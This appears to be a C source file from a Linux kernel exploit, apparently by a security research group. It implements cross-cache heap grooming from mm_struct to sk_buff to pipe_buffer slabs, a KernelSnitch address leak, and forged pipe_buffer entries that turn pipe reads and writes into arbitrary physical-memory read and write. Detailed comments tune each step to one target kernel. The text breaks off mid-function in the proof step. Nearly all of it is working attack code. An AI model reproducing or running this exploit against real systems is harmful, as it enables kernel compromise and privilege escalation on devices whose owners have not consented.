#include "common.h"

#define PIPE_SHAPE_ROUNDS 0
#define PHYSRW_PROOF_OFF 0x7000
/*
 * Proof scribble area: the kmalloc slack of our own pipe_buffer
 * object. A 16-slot ring uses 640B of the 1KB object; bytes
 * [640,1024) are unused slack we own, so proof writes can never
 * corrupt foreign kernel memory. proof64 uses +0x100 (max 904B).
 */
#define PIPE_PROOF_OFF (PIPE_STAGE2_SLOTS * 40)
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

/*
 * Reclaim strategy: cross-cache at ORDER-2, no coalescing required.
 * Stage 1: mm_struct(order-2) -> buddy -> sk_buff(true order-2 frag page)
 * Stage 2: sk_buff(order-2 release) -> buddy -> pipe_buffer slab(kmalloc-1k, order-2)
 *
 * kmalloc-1k slabs are order-2 on this kernel (NR_CPUS=6 ->
 * min_objects=16 -> calculate_order(1024)=2, 16 objs/slab, verified
 * by /sys/kernel/slab/kmalloc-rcl-1k/order=2 on device), exactly the
 * mm_struct slab order. The freed mm_struct slab page is reclaimed
 * directly at order-2 and handed to the pipe_buffer slab at order-2;
 * the fragile "order-2 pair merges into order-3" step is gone.
 *
 * 16 slots * 40B = 640B -> kmalloc-1k (this kernel has no per-memcg
 * kmalloc caches; __GFP_ACCOUNT does not change cache selection).
 * drain/slot-fill use AF_UNIX sk_buff 1k objects (896B linear-head
 * allocs) instead of pipes, so pipe_user_pages_soft (16384 pages)
 * only has to cover the reclaim pipes: 192 * 16 slots = 3072 <= 16384.
 * (CONFIG_SYSVIPC is off on this kernel, so msg_msg is unusable.)
 */
/*
 * The target kernel only has a PCP (per-cpu pageset) for order-0;
 * order-2 allocations always go straight to the buddy freelists, so a
 * separate "PCP drain" can never drain anything for us. It is merged
 * into the buddy drain below: 256 buddy + 12 former-PCP = 268 allocs,
 * keeping the total allocation count exactly as before.
 */
#define BUDDY_DRAIN_COUNT 268
#define RECLAIM_ATTEMPTS 12
#define PIPE_STAGE2_SLOTS 16
#define SLOT_FILL_COUNT 16

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
static int sk_drain_svs[PIPE_DRAIN][2];
static int sk_fill_svs[SLOT_FILL_COUNT][2];
static int sk_drain_ready;

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_normal_4k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t kmalloc_cgroup_4k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_STAGE2_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

/*
 * prepare_pipe_buffer_page — single-process cross-cache reclaim.
 *
 * Stage 1: mm_struct (order-2) -> buddy -> sk_buff (true order-2 page)
 * Stage 2: sk_buff release     -> buddy -> pipe_buffer slab (cg-1k, order-2)
 *
 * Both stages operate at order-2, so no buddy coalescing is needed.
 * With all kmalloc-cg-1k slots full, the pipe resize that follows each
 * sk_buff release creates a new slab from buddy HEAD (LIFO), so the
 * just-freed reclaim page is always taken.
 */
uintptr_t prepare_pipe_buffer_page(void) {
  struct mm_ctx prep, spray, pre, post;
  size_t objs_per_slab = (PAGE_SIZE << MM_ORDER) / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  sk_buff_init();

  /*
   * Raise RLIMIT_MEMLOCK to allow larger pipe sizes.
   * PIPE_STAGE2_SLOTS=16 needs 64KB pipe capacity.
   */
  {
    struct rlimit rlim;
    SYSCHK(getrlimit(RLIMIT_MEMLOCK, &rlim));
    rlim.rlim_cur = rlim.rlim_max;
    SYSCHK(setrlimit(RLIMIT_MEMLOCK, &rlim));
  }

  /* Create reclaim pipes + drain socketpairs (objects sent in stage 2) */
  for (size_t i = 0; i < PIPE_RECLAIM; i++)
    make_pipe_object(pipe_fds_reclaim[i]);
  for (size_t i = 0; i < PIPE_DRAIN; i++)
    sk_buff_prepare(sk_drain_svs[i]);
  for (int i = 0; i < SLOT_FILL_COUNT; i++)
    sk_buff_prepare(sk_fill_svs[i]);
  sk_drain_ready = 1;
  pipe_objects_ready = 1;

  /* Allocate prepare + spray mm_structs */
  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  /* Allocate leak slab: pre_ctx + leak_child + post_ctx */
  sched_yield(); sched_yield(); sched_yield(); sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  /* Kill children (memfds keep mm_struct references alive) */
  for (size_t i = 0; i < pre.mm_cnt; i++)
    kill_child(pre.childs[i]);
  for (size_t i = 0; i < post.mm_cnt; i++)
    kill_child(post.childs[i]);
  for (size_t i = 0; i < spray.mm_cnt; i++)
    kill_child(spray.childs[i]);
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
    cleanup_kernelsnitch();
    for (size_t i = 0; i < prep.mm_cnt; i++) {
      if (prep.memfds[i] > 0) close(prep.memfds[i]);
      kill_child(prep.childs[i]);
    }
    if (leak_memfd > 0) close(leak_memfd);
    free_ctx_storage(&prep);
    free_ctx_storage(&spray);
    free_ctx_storage(&pre);
    free_ctx_storage(&post);
    return 0;
  }

  /*
   * Buddy drain: consume order-2 pages to deplete the freelists.
   * (Includes the 12 former "PCP drain" allocations — see the comment
   * at BUDDY_DRAIN_COUNT.)
   */
  static int buddy_drain_sv[BUDDY_DRAIN_COUNT][2];
  for (int i = 0; i < BUDDY_DRAIN_COUNT; i++) {
    sk_buff_prepare(buddy_drain_sv[i]);
    if (MM_ORDER == 2)
      sk_buff_alloc_o2_page(buddy_drain_sv[i]);
    else
      sk_buff_alloc_3_order_page(buddy_drain_sv[i]);
  }

  /* Prepare reclaim sk_buffs */
  static int reclaim_svs[RECLAIM_ATTEMPTS][2];
  for (int r = 0; r < RECLAIM_ATTEMPTS; r++)
    sk_buff_prepare(reclaim_svs[r]);

  pin_to_core(CORE);

  /*
   * Stage 1: free mm_structs, reclaim as sk_buff frag page.
   * Freed order-2 slab pages land on the (drained) order-2 buddy
   * freelist head; each 16384B AF_UNIX sendmsg (data_len=16384,
   * npages=4 -> one order-2 compound frag page, see SKB_O2_DATA_SZ)
   * takes one LIFO. No order-3 coalescing involved.
   */
  for (size_t i = 0; i < pre.mm_cnt; i++)
    SYSCHK(close(pre.memfds[i]));
  for (size_t i = 0; i < post.mm_cnt - 1; i++)
    SYSCHK(close(post.memfds[i]));
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab)
    SYSCHK(close(spray.memfds[i]));
  SYSCHK(close(leak_memfd));

  for (int r = 0; r < RECLAIM_ATTEMPTS; r++) {
    sk_buff_alloc_o2_page(reclaim_svs[r]);
  }

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch mm_struct leak failed\n");
    for (size_t i = 0; i < prep.mm_cnt; i++) {
      if (prep.memfds[i] > 0) close(prep.memfds[i]);
      kill_child(prep.childs[i]);
    }
    free_ctx_storage(&prep);
    free_ctx_storage(&spray);
    free_ctx_storage(&pre);
    free_ctx_storage(&post);
    return 0;
  }
  uintptr_t base = leaked & ~(((uintptr_t)1 << (12 + MM_ORDER)) - 1);
  pin_to_core(CORE);

  /*
   * Stage 2: sk_buff cg-1k drain fills kmalloc-cg-1k partial slabs.
   * 896B skb data allocs land in the same cache as 16-slot
   * pipe_buffer arrays but cost no pipe_user_pages_soft budget.
   * SLOT_FILL_COUNT pure allocations fill remaining free slots,
   * guaranteeing every subsequent cg-1k allocation creates
   * a NEW slab from buddy head (LIFO).
   */
  for (size_t i = 0; i < PIPE_DRAIN; i++)
    sk_buff_alloc_cg1k(sk_drain_svs[i]);
  for (int i = 0; i < SLOT_FILL_COUNT; i++)
    sk_buff_alloc_cg1k(sk_fill_svs[i]);

  /*
   * Interleave sk_buff release + a FULL slab of pipe resizes: each
   * freed order-2 page lands at buddy HEAD; the first of the next
   * 16 resizes creates a new slab from buddy HEAD (reclaiming the
   * page) and the remaining 15 fill it completely. The page spends
   * only microseconds on the buddy freelist, so stray cg-1k/order-2
   * allocations (the cg-1k cache is hot: every default pipe() in
   * the system allocates 640B from it) have almost no chance to
   * steal the page, and every object in the resulting slab is one
   * of our own pipes.
   */
  int pipe_idx = 0;
  for (int r = 0; r < RECLAIM_ATTEMPTS; r++) {
    sk_buff_release(reclaim_svs[r]);
    for (int s = 0; s < PIPE_OBJS_PER_SLAB && pipe_idx < PIPE_RECLAIM; s++)
      resize_pipe_slots(pipe_fds_reclaim[pipe_idx++], PIPE_STAGE2_SLOTS);
  }
  /* Fill remaining reclaim pipes */
  for (; pipe_idx < PIPE_RECLAIM; pipe_idx++)
    resize_pipe_slots(pipe_fds_reclaim[pipe_idx], PIPE_STAGE2_SLOTS);

  /* Now safe to release drain objects */
  for (int i = 0; i < SLOT_FILL_COUNT; i++)
    sk_buff_release(sk_fill_svs[i]);
  for (size_t i = 0; i < PIPE_DRAIN; i++)
    sk_buff_release(sk_drain_svs[i]);
  sk_drain_ready = 0;
  for (int i = 0; i < BUDDY_DRAIN_COUNT; i++)
    sk_buff_release(buddy_drain_sv[i]);

  /* Cleanup prep mm_structs */
  for (size_t i = 0; i < prep.mm_cnt; i++) {
    SYSCHK(close(prep.memfds[i]));
    prep.memfds[i] = -1;
    kill_child(prep.childs[i]);
  }

  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  // pr_info("pipe_buffer page base = %lx\n", base);
  // sleep(1);
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }
  if (sk_drain_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++)
      sk_buff_release(sk_drain_svs[i]);
    for (int i = 0; i < SLOT_FILL_COUNT; i++)
      sk_buff_release(sk_fill_svs[i]);
    sk_drain_ready = 0;
  }

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  /*
   * Accept ONLY kmalloc-1k (normal row). This kernel has no
   * per-memcg kmalloc caches (enum kmalloc_cache_type has no
   * KMALLOC_CGROUP; kmalloc_type() ignores __GFP_ACCOUNT), so our
   * GFP_KERNEL_ACCOUNT pipe_buffer arrays land in plain kmalloc-1k.
   * The old "cgroup" row reads were actually the DMA row and could
   * never match; the working runs all matched kmalloc_normal_1k.
   * Foreign-slab rejection is handled by the batch fingerprint in
   * find_pipe_buffer(), not by cache-type filtering.
   */
  return slab_cache == kmalloc_normal_1k_cache ||
         slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }
  pr_debug("pipe_buffer page base = %lx\n", pipebuf_page_base);
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));

  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_normal_4k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 12];
  /*
   * No per-memcg kmalloc caches on this kernel — row 2 is DMA and
   * must not be used for matching. Keep the legacy variables zeroed
   * so a stale DMA address can never cause a false match.
   */
  kmalloc_cgroup_1k_cache = 0;
  kmalloc_cgroup_2k_cache = 0;
  kmalloc_cgroup_4k_cache = 0;
  pr_debug("kmalloc_normal_1k_cache: %lx\n", kmalloc_normal_1k_cache);
  pr_debug("kmalloc_normal_2k_cache: %lx\n", kmalloc_normal_2k_cache);
  pr_debug("kmalloc_normal_4k_cache: %lx\n", kmalloc_normal_4k_cache);
  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  pr_debug("kmalloc_pipe_cache: %lx\n", kmalloc_pipe_cache);
  /*
   * The cg-1k slab is order-2: scan exactly the leaked order-2 page.
   * (The stage-1 sk_buff reclaim takes precisely this page, so a
   * match is expected at off == 0; wider scans only risk matching a
   * neighbouring foreign cg-1k slab.)
   */
  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pr_debug("page=%lx head=%lx slab_cache=%lx page_type=%x\n",
             page, head, slab_cache, page_type);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;

      pipe_cache_gate_ok = 1;
      pr_debug("pipe_cache_gate_ok = %d\n", pipe_cache_gate_ok);
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  pr_debug("pipe_cache_gate_ok = %d\n", pipe_cache_gate_ok);
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[PIPE_SLAB_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  /*
   * Scan per cg-1k object, not per 8 bytes. Our reclaim pipes were
   * resized (fresh kcalloc'd ring) and then written exactly once, so
   * the used pipe_buffer is ALWAYS ring slot 0 and slots 1..15 are
   * still zeroed. Collect all objects matching this fingerprint.
   */
  struct user_pipe_buffer cand[PIPE_OBJS_PER_SLAB];
  size_t cand_off[PIPE_OBJS_PER_SLAB];
  int ncand = 0;
  for (size_t obj = 0; obj + KMALLOC_PIPE_OBJ_SIZE <= PIPE_SLAB_SIZE;
       obj += KMALLOC_PIPE_OBJ_SIZE) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + obj, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    /* slots 1..15 of the fresh ring must still be kcalloc-zeroed */
    int zero_tail = 1;
    for (size_t z = obj + sizeof(pb);
         z < obj + PIPE_STAGE2_SLOTS * sizeof(pb); z += sizeof(uint64_t)) {
      uint64_t q;
      memcpy(&q, slab + z, sizeof(q));
      if (q != 0) {
        zero_tail = 0;
        break;
      }
    }
    if (!zero_tail) {
      continue;
    }

    cand[ncand] = pb;
    cand_off[ncand] = obj;
    ncand++;
  }

  /*
   * Batch fingerprint: this slab was created by one batch of 16
   * consecutive pipe resizes (release r -> pipes[16r..16r+15]) and
   * the marker writes set len = pipe_index + 1, so a slab that is
   * really ours has ~16 candidates whose lens are 16 CONSECUTIVE
   * values inside [1, PIPE_RECLAIM]. A foreign cg-1k slab (other
   * processes' default pipes — same cache, same 640B size) cannot
   * reproduce this. Without this check a fully-foreign slab passes
   * the per-object fingerprint and we would forge a fake
   * pipe_buffer over somebody else's live pipe (kernel panic).
   */
  int best = 0;
  for (int k = 1; k <= PIPE_RECLAIM; k++) {
    int cnt = 0;
    for (int j = 0; j < ncand; j++) {
      if ((int)cand[j].len >= k &&
          (int)cand[j].len < k + PIPE_OBJS_PER_SLAB) {
        cnt++;
      }
    }
    if (cnt > best) {
      best = cnt;
    }
  }
  if (ncand == 0 || best < PIPE_OBJS_PER_SLAB - 4) {
    pr_debug("pipe slab batch fingerprint rejected: ncand=%d best=%d\n",
             ncand, best);
    return 0;
  }

  pipebuf_addr = base + cand_off[0];
  pipebuf_pipe_idx = (int)cand[0].len - 1;
  pipe_probe_found = 1;
  pipe_probe_page = cand[0].page;
  pipe_probe_ops = cand[0].ops;
  pipe_probe_private = cand[0].private;
  pipe_probe_len = cand[0].len;
  pipe_probe_flags = cand[0].flags;
  return 1;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  /*
   * If the restore fails, the forged pipe_buffer stays in place and
   * any later pipe op/close will put_page() the proof page —
   * a delayed kernel panic. Fail loudly instead of continuing.
   */
  if (kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    pr_error("pipe_phys_read: restore failed, slot left forged!\n");
    return 0;
  }
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  /* See pipe_phys_read: a failed restore leaves a live forged slot. */
  if (kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    pr_error("pipe_phys_write: restore failed, slot left forged!\n");
    return 0;
  }
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }

  if (!pipe_reclaim_cache_gate(fd)) {
    pr_debug("phys step cache gate failed slab=%016zx want=%016zx\n",
             candidate_slab_cache, kmalloc_pipe_cache);
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_debug("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
           found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
           pipe_scan_ops, pipe_scan_len);
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  /*
   * Proof region: the kmalloc slack of our OWN pipe_buffer object
   * (bytes [640,1024) of its 1KB slot — see PIPE_PROOF_OFF). The
   * old proof used page_base + 0x7000, which is OUTSIDE the 16KB
   * (order-2) fops heap page: every successful gate scribbled the
   * seed/tag into an unrelated neighbouring kernel page — a random
   * delayed kernel panic that only became frequent once the gate
   * started passing reliably.
   */
  uintptr_t proof_addr = pipebuf_addr + PIPE_PROOF_OFF;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
